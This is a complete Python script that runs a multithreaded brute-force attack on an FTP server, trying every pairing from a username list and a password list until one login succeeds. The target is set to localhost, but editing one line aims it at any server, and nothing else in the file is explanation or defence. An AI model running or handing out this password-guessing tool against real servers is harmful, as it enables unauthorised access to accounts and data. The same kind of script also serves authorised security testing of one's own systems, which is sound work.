import ftplib
import threading
import queue

# ===== CONFIG =====
FTP_HOST = "127.0.0.1"
FTP_PORT = 21
TIMEOUT = 5
THREADS = 5
# ==================

q = queue.Queue()
found = threading.Event()

def attempt_login(username, password):
    try:
        ftp = ftplib.FTP()
        ftp.connect(FTP_HOST, FTP_PORT, timeout=TIMEOUT)
        ftp.login(username, password)
        print(f"[SUCCESS] {username}:{password}")
        found.set()
        ftp.quit()
    except:
        print(f"[FAIL] {username}:{password}")

def worker():
    while not q.empty() and not found.is_set():
        username, password = q.get()
        attempt_login(username, password)
        q.task_done()

def main():
    users = [u.strip() for u in open("users.txt")]
    passwords = [p.strip() for p in open("passwords.txt")]

    for u in users:
        for p in passwords:
            q.put((u, p))

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()

if __name__ == "__main__":
    main()
